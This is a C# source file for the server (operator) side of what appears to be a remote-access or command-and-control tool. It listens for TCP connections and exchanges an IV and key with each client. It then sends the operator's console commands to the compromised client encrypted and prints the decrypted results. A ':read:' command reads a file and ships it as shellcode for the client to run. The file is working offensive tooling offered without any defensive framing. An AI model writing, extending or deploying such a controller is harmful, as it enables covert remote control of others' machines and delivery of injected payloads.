using System;
using System.Net;
using System.IO;
using System.Net.Sockets;

class Server : IDisposable {
    TcpListener tcp;
    string iv, key;
    
    /// <summary>
    /// Initialize the tcp server
    /// </summary>
    /// <param name="port">Port number</param>
    public Server(int port) {
        tcp = new TcpListener(IPAddress.Any, port);
        iv = key = string.Empty;
    }

    /// <summary>
    /// Start the server and accept connections
    /// </summary>
    public void Setup() {
        tcp.Start();
        AcceptConnections();
    }


    /// <summary>
    /// Accept and handle connections
    /// </summary>
    private void AcceptConnections() {
        while (true) {
            try {
                using(var client = tcp.AcceptTcpClient()) {
                    string addr = client.Client.RemoteEndPoint.ToString();
                    Console.WriteLine("[!] Client Connected: tcp://{0}", addr);

                    using (var stream = client.GetStream()) {
                        using (var ws = new StreamWriter(stream) { AutoFlush = true })  {
                            using(var rs = new StreamReader(stream)) {
                                iv = rs.ReadLine();
                                key = rs.ReadLine();

                                while (true) {
                                    Console.Write("> ");
                                    string cmd = Console.ReadLine().Trim();
                                    if (cmd.ToLower() == "exit") break;

                                    byte[] enc;
                                    if (cmd.ToLower().StartsWith(":read:") && cmd.Split(' ').Length == 2) {
                                        // send shellcode magic number
                                        ws.WriteLine(Utils.SerializeBytes(Utils.EncryptData(":shellcode:", iv, key)));

                                        // read the payload file
                                        var filePath = cmd.Split(' ')[1];
                                        var shellcode = Utils.ReadBinaryFile(filePath);
                                        
                                        // encrypt the shellcode
                                        enc = Utils.EncryptData(Utils.SerializeBytes(shellcode), iv, key);
                                    } else {
                                        // send comamnd
                                        enc = Utils.EncryptData(cmd, iv, key);
                                    }
                                   
                                    string serialized = Utils.SerializeBytes(enc);
                                    ws.WriteLine(serialized);
                                    string output = rs.ReadLine();
                                    string decrypted = Utils.DecryptData(Utils.DeserializeData(output), iv, key);
                                    Console.WriteLine(decrypted);
                                }
                            }
                        }
                    }

                    Console.WriteLine("[!] Client Disconnected: {0}", addr);
                }
            } catch (Exception e) {
                Console.WriteLine("[x] Error: {0}", e.Message);
                break;
            }
        }

    }

    /// <summary>
    /// Stop the server and release the resources
    /// </summary>
    public void Dispose() {
        tcp.Stop();
        iv = key = string.Empty;
    }
}
